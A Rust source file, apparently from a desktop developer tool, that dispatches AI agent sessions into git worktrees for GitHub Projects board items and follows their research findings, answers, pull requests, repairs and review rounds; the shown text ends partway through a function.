//! Dispatch (ADR-0027): after each board read, start a round for every item the user moved
//! into a trigger column, in a worktree of its own with an agent session on it. When a research
//! round's session is idle with its findings written, post them on the issue, then read the
//! answers to its decision points and hand them to the implementation round. Watch that round's
//! pull request, report it on the issue and move the item to In review when it is ready. While
//! nobody reviewed it, hand the round's session a repair when it can't merge, and each comment a
//! teammate with write access writes on it, and post the agent's answer. A review round on it
//! posts the agent's reply on the pull request and reports it again once its session is done.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use anyhow::Context as _;
use codescope_core::agents::claude::live_session;
use codescope_core::board::dispatch::{
    FINDINGS_FILE, Facts, HandoverSession, Hold, OwnPullRequest, PostedFindings, ProjectRemotes,
    REPLY_FILE, ReviewRound, Round, StatusChange, WorktreeDispatch, add_dispatch_worktree,
    add_fork_worktree, add_pull_request_worktree, branch_base, branch_name, clear_findings,
    clear_reply, counts_towards_limit, decide, exclude_handover_files, fetch_branch_head,
    fetch_pull_head, find_skill, fork_branch, fork_push, is_plain_branch, launch_with_task,
    mover_to_check, moves_to_needs_decision, opened_by, projects_for_repository,
    remote_branch_tip, set_fork_push, start_still_wanted, task_file, task_message,
    track_remote_branch, tracks_same_name, trigger_content_ids, write_task_file,
};
use codescope_core::board::answers::{
    Answer, Comment, after_findings, answer_body, answers_section, choices_text, chosen,
    find_answers,
};
use codescope_core::board::findings::{
    DecisionPoint, FileStamp, Outcome, Problem, comment_body, posted_findings, problems_list,
    problems_message, read_findings,
};
use codescope_core::board::forward::{
    ForwardFacts, ForwardStep, Forwarded, authors, comments_since, forward_message, forward_step,
    forward_task, new_comments,
};
use codescope_core::board::github::{self, NewComment, TriggerReads, Viewer, moves_back_from_review};
use codescope_core::board::pull_request::{
    Checks, PostedPullRequest, PullRequest, PullRequestComment, PullRequestHead, PullRequestState,
    moves_to_in_review, pull_request_comment, review_round_worked, round_pull_request,
};
use codescope_core::board::setup::run_setup;
use codescope_core::board::reply::{read_reply, reply_problems_message};
use codescope_core::board::repair::{
    Fault, FaultKind, REPAIR_ATTEMPTS, Repair, RepairStep, fault, repair_message, repair_step,
    repair_task,
};
use codescope_core::board::{
    Board, BoardItem, BoardRef, ColumnMapping, ColumnRole, ItemKind, effective_mapping,
    mapped_column,
};
use codescope_core::path_canon::paths_match;
use codescope_core::process_tree;
use codescope_core::{AgentProfile, SessionState, TelemetrySnapshot};
use codescope_core::projects::{Project, ProjectKind, ProjectsConfig};
use codescope_core::worktree_create::{PendingId, record_dispatch, record_posted_findings};
use codescope_terminal::TerminalView;
use futures_channel::oneshot;
use gpui::{App, AppContext as _, Context, Entity, SharedString, Window};

use super::{AppShell, ToastKind};

mod cleanup;
use crate::dialogs::confirm::ConfirmSpec;
use crate::dialogs::new_worktree::sanitize_branch_to_folder;
use crate::notifications::NotificationKind;

const REMOTES_MAX_AGE: Duration = Duration::from_secs(300);
const VIEWER_MAX_AGE: Duration = Duration::from_secs(300);
const WORKFLOWS_MAX_AGE: Duration = Duration::from_secs(600);
const ACCESS_RECHECK_AFTER: Duration = Duration::from_secs(300);
const ACCESS_EXPIRES_AFTER: Duration = Duration::from_secs(600);
/// Text and Enter in one write can reach an agent's prompt as a paste, whose Enter is a newline.
const SUBMIT_AFTER_TYPING: Duration = Duration::from_millis(200);
const LAUNCH_GRACE: Duration = Duration::from_secs(30);
const MAX_REMINDERS: u32 = 3;
const POST_RETRY: Duration = Duration::from_secs(120);
const PULL_REQUEST_READ_EVERY: Duration = Duration::from_secs(30);
/// GitHub registers a push's checks and works out its mergeability a while after the push.
const HEALTHY_BEFORE_REPAIRS_RESET: Duration = Duration::from_secs(120);

#[derive(Default)]
pub(crate) struct DispatchState {
    viewer: Option<Viewer>,
    viewer_read_at: Option<Instant>,
    viewer_error: Option<String>,
    /// Write access by `(repository, login)`, both lower case, and when it was read.
    access: HashMap<(String, String), (bool, Instant)>,
    remotes: Vec<ProjectRemotes>,
    remotes_read_at: Option<Instant>,
    /// Item id → the round being started.
    starting: HashMap<String, Round>,
    /// Items of `starting` whose new worktree runs its setup.
    setting_up: HashSet<String>,
    /// Item id → the move that failed to start, and why.
    failed: HashMap<String, (String, String)>,
    /// Item id → the move of a fork's pull request the user confirmed starting.
    fork_confirmed: HashMap<String, String>,
    holds: HashMap<String, Hold>,
    /// Rounds whose findings are being posted.
    posting: HashSet<RoundKey>,
    /// Round → when posting or saving its findings failed, and the card's line about it.
    post_errors: HashMap<RoundKey, (Instant, String)>,
    /// Round → what is wrong with its findings and what the session was told.
    reminders: HashMap<RoundKey, Reminder>,
    /// Rounds whose findings wait for the user to free a tab on their worktree, and what holds it.
    findings_held: HashMap<RoundKey, HeldBy>,
    findings_announced: HashSet<RoundKey>,
    /// Content id → the decision points posted on it and the answers so far.
    discussions: HashMap<String, Discussion>,
    /// Items the Decide dialog moved to Ready, until their implementation round starts.
    readied: HashSet<String>,
    /// Item id → the pull request and session of its implementation or review round, or of a
    /// research round on an item with a pull request.
    watches: HashMap<String, PullRequestWatch>,
    seen_from_start: HashSet<RoundKey>,
    /// Item id → the cleanup of a dispatch whose work ended.
    cleanups: HashMap<String, cleanup::Cleanup>,
}

/// What the board poll knows about the pull request of an implementation or review round, and
/// about the round's session.
#[derive(Default)]
struct PullRequestWatch {
    round: Option<String>,
    reading: bool,
    /// When the last read started, whether it worked or not.
    read_at: Option<Instant>,
    /// When the last read that worked started.
    read_ok_at: Option<Instant>,
    /// What the last read that worked found.
    pull_request: Option<PullRequest>,
    /// Whether the session worked in this round; taken as so for a round started before
    /// CodeScope did.
    busy_seen: bool,
    /// How many prompts the session had at the last look.
    turns: Option<u32>,
    /// When the session last stopped; `None` while it works or has no tab.
    idle_since: Option<Instant>,
    /// The stop the bell rang for.
    rang_for: Option<Instant>,
    reporting: bool,
    /// Reported on the issue but not saved to `projects.json`.
    reported: Option<PostedPullRequest>,
    report_error: Option<(Instant, String)>,
    moving: bool,
    move_error: Option<(Instant, String)>,
    marking_ready: bool,
    ending_review: bool,
    review_end_error: Option<(Instant, String)>,
    stop_without_result: Option<Instant>,
    review_reply_url: Option<String>,
    review_report_url: Option<String>,
    reply_reminder: Option<Reminder>,
    review_held: Option<HeldBy>,
    settled_since: Option<Instant>,
    repair_follow: HandoverFollow,
    repair_note: Option<RepairNote>,
    repair_rang: Option<(Option<String>, RepairNote)>,
    healthy_since: Option<(String, Instant)>,
    repair_failed_at: Option<Instant>,
    forward_follow: HandoverFollow,
    forward_note: Option<ForwardNote>,
    forward_rang: Option<String>,
    forward_failed_at: Option<Instant>,
    forward_posting: bool,
    forward_post_error: Option<(Instant, String)>,
}

impl DispatchState {
    fn can_write(&self, repository: &str, login: &str, now: Instant) -> Option<bool> {
        usable_access(self.access.get(&access_key(repository, login)), now)
    }

    fn keep_access(&mut self, checked: Vec<((String, String), Option<bool>)>) {
        let now = Instant::now();
        for (key, answer) in checked {
            match answer {
                Some(can_write) => self.access.insert(key, (can_write, now)),
                None => self.access.remove(&key),
            };
        }
    }
}

impl PullRequestWatch {
    fn follow(&mut self, trigger_at: &str, seen_from_start: bool) {
        if self.round.as_deref() == Some(trigger_at) {
            return;
        }
        *self = PullRequestWatch {
            round: Some(trigger_at.to_string()),
            busy_seen: !seen_from_start,
            reading: self.reading,
            read_at: self.read_at,
            read_ok_at: self.read_ok_at,
            pull_request: self.pull_request.take(),
            reporting: self.reporting,
            moving: self.moving,
            marking_ready: self.marking_ready,
            ending_review: self.ending_review,
            forward_posting: self.forward_posting,
            ..PullRequestWatch::default()
        };
    }

    fn track(&mut self, session: Option<(SessionState, u32)>) {
        let Some((state, turns)) = session else {
            self.idle_since = None;
            return;
        };
        let new_turn = self.turns.is_some_and(|seen| turns > seen);
        self.turns = Some(turns);
        match state {
            SessionState::Busy | SessionState::PendingToolUse => {
                self.busy_seen = true;
                self.idle_since = None;
            }
            SessionState::Idle if new_turn => {
                self.busy_seen = true;
                self.idle_since = Some(Instant::now());
            }
            SessionState::Idle => {
                self.idle_since.get_or_insert_with(Instant::now);
            }
            SessionState::Unknown => self.idle_since = None,
        }
    }

    /// Every 30 s while the item is in In progress or In review or its pull request is open, and
    /// right after the session stops; and for a `posted` pull request until a read works,
    /// wherever the item is, so a move to Ready can tell a review round from an implementation.
    fn read_due(&self, role: Option<ColumnRole>, posted: bool) -> bool {
        let open = self
            .pull_request
            .as_ref()
            .is_some_and(|pr| pr.state == PullRequestState::Open);
        let unread = posted && self.read_ok_at.is_none();
        let watched = open
            || unread
            || matches!(role, Some(ColumnRole::InProgress | ColumnRole::InReview));
        if self.reading || !watched {
            return false;
        }
        let Some(read_at) = self.read_at else {
            return true;
        };
        read_at.elapsed() >= PULL_REQUEST_READ_EVERY
            || self.idle_since.is_some_and(|idle| read_at < idle)
    }

    fn own_pull_request(&self, posted: bool) -> OwnPullRequest {
        if !posted {
            return OwnPullRequest::NotOpened;
        }
        if self.read_ok_at.is_none() {
            return OwnPullRequest::Unread;
        }
        match &self.pull_request {
            Some(pr) if pr.state == PullRequestState::Open => OwnPullRequest::Open,
            _ => OwnPullRequest::Closed,
        }
    }

    /// The session worked and stopped, and a read since then found no pull request.
    fn waits_for_you(&self) -> bool {
        self.pull_request.is_none() && self.stopped_after_work()
    }

    fn stopped_after_work(&self) -> bool {
        self.busy_seen
            && self
                .idle_since
                .zip(self.read_ok_at)
                .is_some_and(|(idle, read)| read > idle)
    }

    fn read_after_stop(&self) -> bool {
        self.idle_since
            .is_none_or(|idle| self.read_ok_at.is_some_and(|read| read > idle))
    }

    fn review_stop(&self) -> Option<Instant> {
        self.idle_since.or(self.settled_since)
    }

    fn stopped_without_result(&self) -> bool {
        self.stop_without_result.is_some() && self.stop_without_result == self.review_stop()
    }
}

#[derive(Default)]
struct HandoverFollow {
    started: Option<String>,
    worked: bool,
    stopped_at: Option<Instant>,
    turns: Option<u32>,
}

impl HandoverFollow {
    fn start(&mut self, started: String, turns: Option<u32>) {
        *self = HandoverFollow {
            started: Some(started),
            turns,
            ..HandoverFollow::default()
        };
    }

    fn look(&mut self, started: Option<String>, working: bool, turns: Option<u32>) {
        if self.started != started {
            self.started = started;
            self.worked = true;
            self.stopped_at = None;
        }
        let new_turn = turns > self.turns;
        self.turns = turns;
        self.worked |= working || new_turn;
        if working {
            self.stopped_at = None;
        } else if new_turn {
            self.stopped_at = Some(Instant::now());
        } else {
            self.stopped_at.get_or_insert_with(Instant::now);
        }
    }

    fn session(&self, working: bool, active: bool, read_ok_at: Option<Instant>) -> HandoverSession {
        if working {
            return HandoverSession::Busy;
        }
        let read_since_stop = self
            .stopped_at
            .zip(read_ok_at)
            .is_some_and(|(stop, read)| read > stop);
        if active && self.worked && read_since_stop {
            HandoverSession::Stopped
        } else {
            HandoverSession::Idle
        }
    }
}

enum Route {
    Type(Entity<TerminalView>),
    Launch(Launch),
}

fn carried_pull_request(
    round: Round,
    posted: Option<PostedPullRequest>,
    open: Option<&PullRequest>,
) -> Option<PostedPullRequest> {
    let posted = posted.filter(|_| round != Round::Implementation)?;
    let posted = match open {
        Some(pr) if pr.number != posted.number => PostedPullRequest {
            number: pr.number,
            url: pr.url.clone(),
            ..posted
        },
        _ => posted,
    };
    Some(PostedPullRequest {
        in_review: false,
        ..posted
    })
}

fn review_round(record: &WorktreeDispatch, watch: &PullRequestWatch) -> ReviewRound {
    let mut review = record.review.clone().unwrap_or_default();
    review.reply_url = review.reply_url.or_else(|| watch.review_reply_url.clone());
    review.report_url = review.report_url.or_else(|| watch.review_report_url.clone());
    review
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReviewSession {
    Working,
    Held(HeldBy),
    Claude {
        stopped_after_work: bool,
        stop_checked: bool,
    },
    Settled {
        stop_checked: bool,
    },
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum ReviewStep {
    Wait,
    Held(HeldBy),
    FixReply(Vec<Problem>),
    End {
        reply: Option<String>,
        check_threads: bool,
    },
}

fn review_step(
    pr: &PullRequest,
    review: &ReviewRound,
    reply: Option<Result<Option<String>, Vec<Problem>>>,
    session: ReviewSession,
) -> ReviewStep {
    let reply = reply.filter(|_| review.reply_url.is_none());
    let pushed = review.start_head.as_deref().is_some_and(|start| start != pr.head_oid);
    let wrote = matches!(reply, Some(Err(_) | Ok(Some(_))));
    let result = pushed || wrote || review.reply_url.is_some();
    let check_threads = match session {
        ReviewSession::Working | ReviewSession::Claude {
            stopped_after_work: false,
            ..
        } => return ReviewStep::Wait,
        ReviewSession::Held(by) if result => return ReviewStep::Held(by),
        ReviewSession::Held(_) => return ReviewStep::Wait,
        ReviewSession::Claude { stop_checked, .. } | ReviewSession::Settled { stop_checked } => {
            !stop_checked
        }
    };
    match reply {
        Some(Err(problems)) => ReviewStep::FixReply(problems),
        Some(Ok(Some(body))) => ReviewStep::End {
            reply: Some(body),
            check_threads: false,
        },
        _ if result || check_threads => ReviewStep::End {
            reply: None,
            check_threads: !result,
        },
        _ => ReviewStep::Wait,
    }
}

struct ReviewEnd {
    item_id: String,
    content_id: String,
    kind: ItemKind,
    since: String,
    pr: PullRequest,
    start_head: Option<String>,
    reply: Option<String>,
    check_threads: bool,
}

struct ReviewEnded {
    reply_url: Option<String>,
    report_url: Result<Option<String>, String>,
}

fn post_review_end(end: &ReviewEnd) -> ReviewEnded {
    let mut reply_url = None;
    let report_url = report_review_end(end, &mut reply_url);
    ReviewEnded {
        reply_url,
        report_url,
    }
}

fn report_review_end(
    end: &ReviewEnd,
    reply_url: &mut Option<String>,
) -> Result<Option<String>, String> {
    if end.check_threads {
        let replied_at =
            github::fetch_last_thread_reply(&end.pr.id).map_err(|err| format!("{err:#}"))?;
        let start = end.start_head.as_deref();
        if !review_round_worked(start, &end.pr.head_oid, replied_at.as_deref(), &end.since) {
            return Ok(None);
        }
    }
    if let Some(body) = &end.reply {
        *reply_url = Some(post_once(&end.item_id, &end.pr.id, &end.since, body)?);
    }
    let report = pull_request_comment(&end.pr, Round::Review, end.kind);
    post_once(&end.item_id, &end.content_id, &end.since, &report).map(Some)
}

fn post_once(item_id: &str, subject_id: &str, since: &str, body: &str) -> Result<String, String> {
    let failed = |err: anyhow::Error| format!("{err:#}");
    let before = github::before_posting(item_id, subject_id, since, body).map_err(failed)?;
    match before.posted {
        Some(url) => Ok(url),
        None => github::add_comment(subject_id, body).map(|new| new.url).map_err(failed),
    }
}

fn own_pull_request(
    record: Option<&WorktreeDispatch>,
    watch: Option<&PullRequestWatch>,
) -> OwnPullRequest {
    let posted = record.is_some_and(|r| r.pull_request.is_some())
        || watch.is_some_and(|w| w.reported.is_some());
    match watch {
        Some(watch) => watch.own_pull_request(posted),
        None if posted => OwnPullRequest::Unread,
        None => OwnPullRequest::NotOpened,
    }
}

fn retry_due(error: &Option<(Instant, String)>) -> bool {
    error.as_ref().is_none_or(|(at, _)| at.elapsed() >= POST_RETRY)
}

/// A round: the board item's id and when the move that started the round was made.
type RoundKey = (String, String);

fn round_key(record: &WorktreeDispatch) -> RoundKey {
    (record.item_id.clone(), record.trigger_at.clone())
}

/// Decision points posted on an item, and the answers on its issue so far.
#[derive(Clone, Default)]
pub(crate) struct Discussion {
    points: Vec<DecisionPoint>,
    answers: Vec<Answer>,
}

/// An item whose decision points wait for answers, as a board read looks them up.
pub(crate) struct DiscussionRead {
    content_id: String,
    repository: String,
    findings_url: String,
    /// When the research round started; older comments never answer it.
    since: String,
}

/// Where an implementation round finds the answers to the research before it.
struct AnswersFrom {
    findings_url: String,
    since: String,
}

/// What the Decide dialog asks about an item.
pub(crate) struct Decision {
    pub item_id: String,
    pub board_url: String,
    pub content_id: String,
    pub kind: ItemKind,
    pub number: u32,
    pub repository: String,
    pub title: String,
    pub findings_url: String,
    pub points: Vec<DecisionPoint>,
    /// Per point, the option the latest answer chose, else the advice.
    pub choices: Vec<char>,
}

/// An answer the Decide dialog sends.
pub(crate) struct AnswerPost {
    pub item_id: String,
    pub board_url: String,
    pub content_id: String,
    pub kind: ItemKind,
    pub number: u32,
    pub choices: Vec<(String, char)>,
    pub note: String,
    pub move_to_ready: bool,
}

#[derive(Default)]
struct Reminder {
    problems: String,
    /// The version of the file the last reminder was about.
    file: Option<FileStamp>,
    sent: u32,
}

impl Reminder {
    fn note(&mut self, problems: &[Problem], file: FileStamp, can_send: bool) -> bool {
        self.problems = problems_list(problems);
        let due = can_send && self.file != Some(file) && self.sent < MAX_REMINDERS;
        if due {
            self.file = Some(file);
            self.sent += 1;
        }
        due
    }
}

struct Notice {
    title: String,
    detail: String,
}

enum SessionAt {
    Working,
    Held(HeldBy),
    Done(Remind),
}

enum Remind {
    Typing(Entity<TerminalView>),
    Notice,
    Nothing,
}

struct Posting {
    record: WorktreeDispatch,
    path: PathBuf,
    outcome: Outcome,
    points: Vec<DecisionPoint>,
}

struct Posted {
    url: String,
    move_error: Option<String>,
}

/// What a board read needs from the app, taken on the foreground.
pub(crate) struct ReadInput {
    boards: Vec<(String, ColumnMapping)>,
    viewer: Option<Viewer>,
    known_access: HashMap<(String, String), bool>,
    /// Local projects as `(id, path)`, when their remotes are due for a read.
    projects: Option<Vec<(String, String)>>,
    discussions: Vec<DiscussionRead>,
    workflows_due: Vec<String>,
}

#[derive(Default)]
pub(crate) struct ReadOutput {
    pub boards: Vec<BoardFetch>,
    viewer: Option<Result<Viewer, String>>,
    /// Write access by `(repository, login)`; `None` where the check failed.
    access: Vec<((String, String), Option<bool>)>,
    remotes: Option<Vec<ProjectRemotes>>,
    /// Discussions by content id; `None` when they weren't read.
    discussions: Option<HashMap<String, Discussion>>,
}

pub(crate) struct BoardFetch {
    pub url: String,
    pub board: Result<Board, String>,
    /// Last moves and linked pull requests of the items in trigger columns; `None` when they
    /// couldn't be read.
    pub triggers: Option<TriggerReads>,
    pub workflows: Option<Result<Vec<String>, String>>,
}

/// A card's line about dispatch.
pub(crate) struct CardNote {
    pub text: SharedString,
    pub tone: NoteTone,
    pub action: Option<CardAction>,
}

impl CardNote {
    fn new(text: impl Into<SharedString>, tone: NoteTone) -> Self {
        Self {
            text: text.into(),
            tone,
            action: None,
        }
    }
}

/// A button on a card.
#[derive(Clone, Copy, PartialEq, Eq)]
pub(crate) enum CardAction {
    Decide,
    ReadyForReview,
    StartFromFork,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub(crate) enum NoteTone {
    Working,
    Waiting,
    NeedsYou,
    Failed,
}

struct Start {
    board: Board,
    board_url: String,
    item: BoardItem,
    head: Option<PullRequestHead>,
    round: Round,
    trigger_at: String,
}

struct Job {
    repo: PathBuf,
    path: PathBuf,
    branch: String,
    remote: String,
    create: bool,
    /// The create the sidebar shows as in flight, while `create` runs.
    pending: Option<PendingId>,
    record: WorktreeDispatch,
    assign_to: Option<String>,
    board: Board,
    progress_column_id: String,
    answers_from: Option<AnswersFrom>,
    known_access: HashMap<(String, String), bool>,
    viewer_login: String,
    link_error: Option<String>,
}

struct Launch {
    project_id: String,
    title: codescope_core::TabTitle,
    agent_id: String,
    command: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TabAtHandover {
    Shell,
    IdleClaude,
    Draft,
    Busy,
    Stopped,
    Other,
}

fn running_under(shell: Option<u32>, table: &[(u32, u32)]) -> Option<Vec<u32>> {
    if table.is_empty() {
        return None;
    }
    Some(process_tree::descendants(shell?, table))
}

fn shell_gone(shell: Option<u32>, table: &[(u32, u32)]) -> bool {
    !table.is_empty() && shell.is_some_and(|shell| table.iter().all(|&(pid, _)| pid != shell))
}

struct TabProbe<'a> {
    restarting: bool,
    launched_lately: bool,
    shell_gone: bool,
    running: Option<&'a [u32]>,
    claude_idle: Option<bool>,
    stopped: bool,
    typed: bool,
}

fn tab_at_handover(tab: &TabProbe) -> TabAtHandover {
    if tab.restarting {
        return TabAtHandover::Busy;
    }
    let state = match (tab.running, tab.claude_idle) {
        (Some([]), _) => TabAtHandover::Shell,
        (Some(_), _) if tab.shell_gone => TabAtHandover::Other,
        (Some(_), _) if tab.stopped => TabAtHandover::Stopped,
        (Some(_), Some(true)) if tab.typed => TabAtHandover::Draft,
        (Some(_), Some(true)) => TabAtHandover::IdleClaude,
        (Some(_), Some(false)) => TabAtHandover::Busy,
        _ => TabAtHandover::Other,
    };
    match state {
        TabAtHandover::Shell | TabAtHandover::Other if tab.launched_lately => TabAtHandover::Busy,
        state => state,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Handover {
    Type(usize),
    NewTab,
    Wait(Hold),
}

fn handover_to(tabs: &[TabAtHandover]) -> Handover {
    if let Some(index) = tabs.iter().position(|t| *t == TabAtHandover::IdleClaude) {
        Handover::Type(index)
    } else if tabs.contains(&TabAtHandover::Busy) {
        Handover::Wait(Hold::SessionBusy)
    } else if tabs.contains(&TabAtHandover::Stopped) {
        Handover::Wait(Hold::SessionStopped)
    } else if tabs.contains(&TabAtHandover::Draft) {
        Handover::Wait(Hold::UnsentInput)
    } else if tabs.contains(&TabAtHandover::Other) {
        Handover::Wait(Hold::OtherProgram)
    } else {
        Handover::NewTab
    }
}

enum HandoverTarget {
    Type(Entity<TerminalView>),
    NewTab,
    Wait(Hold),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FindingsGate {
    Settled(RemindBy),
    Wait,
    Held(HeldBy),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HeldBy {
    Program,
    QuietAgent,
    StoppedSession,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RemindBy {
    Typing(usize),
    Notice,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Turn {
    Ended,
    Running,
    Quiet,
    Unknown,
}

fn turn_of(state: codescope_core::SessionState, quiet_timeout: bool) -> Turn {
    use codescope_core::SessionState;
    match state {
        _ if quiet_timeout => Turn::Quiet,
        SessionState::Idle => Turn::Ended,
        SessionState::Busy | SessionState::PendingToolUse => Turn::Running,
        SessionState::Unknown => Turn::Unknown,
    }
}

fn findings_gate(tabs: &[(TabAtHandover, Turn)]) -> FindingsGate {
    let other = |turn: Turn| tabs.contains(&(TabAtHandover::Other, turn));
    if tabs.iter().any(|(state, _)| *state == TabAtHandover::Busy) || other(Turn::Running) {
        return FindingsGate::Wait;
    }
    if other(Turn::Unknown) {
        return FindingsGate::Held(HeldBy::Program);
    }
    if other(Turn::Quiet) {
        return FindingsGate::Held(HeldBy::QuietAgent);
    }
    if tabs.iter().any(|(state, _)| *state == TabAtHandover::Stopped) {
        return FindingsGate::Held(HeldBy::StoppedSession);
    }
    let idle_claude = tabs.iter().position(|(state, _)| *state == TabAtHandover::IdleClaude);
    FindingsGate::Settled(idle_claude.map_or(RemindBy::Notice, RemindBy::Typing))
}

struct Place {
    create: bool,
    path: PathBuf,
    branch: String,
}

fn fresh_access(
    access: &HashMap<(String, String), (bool, Instant)>,
) -> HashMap<(String, String), bool> {
    access
        .iter()
        .filter(|(_, (_, at))| at.elapsed() < ACCESS_RECHECK_AFTER)
        .map(|(key, (can_write, _))| (key.clone(), *can_write))
        .collect()
}

fn usable_access(answer: Option<&(bool, Instant)>, now: Instant) -> Option<bool> {
    answer
        .filter(|(_, at)| now.saturating_duration_since(*at) < ACCESS_EXPIRES_AFTER)
        .map(|(can_write, _)| *can_write)
}

fn access_key(repository: &str, login: &str) -> (String, String) {
    (repository.to_ascii_lowercase(), login.to_ascii_lowercase())
}

/// Read every board, and for items in trigger columns their last moves, who is signed in to
/// `gh`, the write access of teammates who moved them, and the projects' remotes.
pub(crate) fn read_boards(input: ReadInput) -> ReadOutput {
    let mut output = ReadOutput::default();
    let mut viewer = input.viewer;
    if viewer.is_none() {
        let fetched = github::fetch_viewer().map_err(|err| format!("{err:#}"));
        viewer = fetched.as_ref().ok().cloned();
        output.viewer = Some(fetched);
    }
    let mut any_trigger = false;
    for (url, stored) in input.boards {
        let board = match BoardRef::parse_url(&url) {
            Some(board) => github::fetch_board(&board).map_err(|err| format!("{err:#}")),
            None => Err("this is not a GitHub Projects board URL".to_string()),
        };
        let triggers = board.as_ref().ok().and_then(|board| {
            let ids = trigger_content_ids(board, &effective_mapping(board, &stored));
            if ids.is_empty() {
                return Some(TriggerReads::default());
            }
            any_trigger = true;
            github::fetch_trigger_reads(&board.id, &ids)
                .inspect_err(|err| eprintln!("warning: couldn't read moves on {url}: {err:#}"))
                .ok()
        });
        if let (Ok(board), Some(found), Some(viewer)) = (&board, &triggers, &viewer) {
            check_access(board, &found.changes, viewer, &input.known_access, &mut output.access);
        }
        let workflows = match BoardRef::parse_url(&url) {
            Some(wanted) if board.is_ok() && input.workflows_due.contains(&url) => Some(
                github::fetch_enabled_workflows(&wanted).map_err(|err| {
                    eprintln!("warning: couldn't read workflows on {url}: {err:#}");
                    format!("{err:#}")
                }),
            ),
            _ => None,
        };
        output.boards.push(BoardFetch {
            url,
            board,
            triggers,
            workflows,
        });
    }
    if !input.discussions.is_empty() {
        if viewer.is_none() {
            output.viewer = Some(github::fetch_viewer().map_err(|err| format!("{err:#}")));
        }
        output.discussions =
            read_discussions(&input.discussions, &input.known_access, &mut output.access);
    }
    if any_trigger && let Some(projects) = input.projects {
        output.remotes = Some(
            projects
                .into_iter()
                .map(|(project_id, path)| ProjectRemotes {
                    remotes: codescope_core::git::remote_urls(Path::new(&path))
                        .unwrap_or_default(),
                    project_id,
                    path,
                })
                .collect(),
        );
    }
    output
}

fn check_access(
    board: &Board,
    changes: &HashMap<String, StatusChange>,
    viewer: &Viewer,
    known: &HashMap<(String, String), bool>,
    found: &mut Vec<((String, String), Option<bool>)>,
) {
    for item in &board.items {
        let (Some(id), Some(repository)) = (&item.content_id, &item.repository) else {
            continue;
        };
        let Some(login) = changes
            .get(id)
            .and_then(|change| mover_to_check(item, change, &viewer.login))
        else {
            continue;
        };
        check_write_access(repository, login, known, found);
    }
}

fn check_write_access(
    repository: &str,
    login: &str,
    known: &HashMap<(String, String), bool>,
    found: &mut Vec<((String, String), Option<bool>)>,
) {
    let key = access_key(repository, login);
    if known.contains_key(&key) || found.iter().any(|(k, _)| *k == key) {
        return;
    }
    let answer = github::can_write(repository, login)
        .inspect_err(|err| {
            eprintln!("warning: couldn't check {login}'s access to {repository}: {err:#}")
        })
        .ok();
    found.push((key, answer));
}

fn read_discussions(
    reads: &[DiscussionRead],
    known: &HashMap<(String, String), bool>,
    found: &mut Vec<((String, String), Option<bool>)>,
) -> Option<HashMap<String, Discussion>> {
    let ids: Vec<String> = reads.iter().map(|r| r.content_id.clone()).collect();
    let comments = github::fetch_comments(&ids)
        .inspect_err(|err| eprintln!("warning: couldn't read the answers: {err:#}"))
        .ok()?;
    let mut discussions = HashMap::new();
    for read in reads {
        let Some(list) = comments.get(&read.content_id) else {
            continue;
        };
        let found_here = discussion(
            list,
            &read.repository,
            &read.findings_url,
            &read.since,
            known,
            found,
        );
        discussions.insert(read.content_id.clone(), found_here);
    }
    Some(discussions)
}

/// The decision points of the findings comment among `comments`, and the answers after it.
/// Write access that `known` doesn't cover is checked and added to `found`.
fn discussion(
    comments: &[Comment],
    repository: &str,
    findings_url: &str,
    since: &str,
    known: &HashMap<(String, String), bool>,
    found: &mut Vec<((String, String), Option<bool>)>,
) -> Discussion {
    let points = comments
        .iter()
        .find(|c| c.url == findings_url)
        .and_then(|c| posted_findings(&c.body))
        .map(|findings| findings.decision_points)
        .unwrap_or_default();
    for comment in after_findings(comments, findings_url, since) {
        if let Some(login) = comment.author.as_deref() {
            check_write_access(repository, login, known, found);
        }
    }
    let found: &[((String, String), Option<bool>)] = found;
    let can_write = |login: &str| {
        let key = access_key(repository, login);
        known
            .get(&key)
            .copied()
            .or_else(|| found.iter().find(|(k, _)| *k == key).and_then(|(_, can)| *can))
            .unwrap_or(false)
    };
    let answers = find_answers(comments, findings_url, since, &points, can_write);
    Discussion { points, answers }
}

/// The `## Answers` section of the task file of the round after research, read fresh from the
/// item's comments.
fn answers_for_task(job: &Job, from: &AnswersFrom) -> String {
    let record = &job.record;
    let comments = github::fetch_comments(std::slice::from_ref(&record.content_id))
        .inspect_err(|err| {
            eprintln!("warning: couldn't read #{}'s answers: {err:#}", record.number)
        })
        .ok()
        .and_then(|mut found| found.remove(&record.content_id));
    let mut checked = Vec::new();
    let discussion = comments.map(|comments| {
        discussion(
            &comments,
            &record.repository,
            &from.findings_url,
            &from.since,
            &job.known_access,
            &mut checked,
        )
    });
    let answers = discussion.as_ref().map(|d| d.answers.as_slice());
    answers_section(answers, &from.findings_url, record.kind)
}

fn create_worktree(job: &Job) -> anyhow::Result<()> {
    let number = job.record.number;
    if job.create {
        let (repo, path, branch, remote) = (&job.repo, &job.path, &job.branch, &job.remote);
        match job.record.kind {
            ItemKind::PullRequest if job.record.fork.is_some() => {
                add_fork_worktree(repo, path, branch, remote, number)?
            }
            ItemKind::PullRequest => add_pull_request_worktree(repo, path, branch, remote)?,
            ItemKind::Issue | ItemKind::Draft => add_dispatch_worktree(repo, path, branch, remote)?,
        }
    }
    if let Some(fork) = &job.record.fork {
        set_fork_push(&job.repo, &job.branch, number, fork)?;
    }
    exclude_handover_files(&job.path)
}

fn set_up_worktree(job: &mut Job) -> anyhow::Result<()> {
    if job.create {
        run_setup(&job.repo, &job.path, &job.remote)?;
    }
    let number = job.record.number;
    let from_fork = job.record.fork.is_some();
    match job.record.round {
        Round::Research => clear_findings(&job.path)?,
        Round::Review => {
            clear_reply(&job.path)?;
            match job.record.kind {
                ItemKind::PullRequest => {
                    let head = if from_fork {
                        fetch_pull_head(&job.repo, &job.remote, number)?
                    } else {
                        fetch_branch_head(&job.repo, &job.remote, &job.branch)?
                    };
                    if let Some(review) = job.record.review.as_mut() {
                        review.start_head = Some(head);
                    }
                }
                ItemKind::Issue | ItemKind::Draft => refresh_start_head(job),
            }
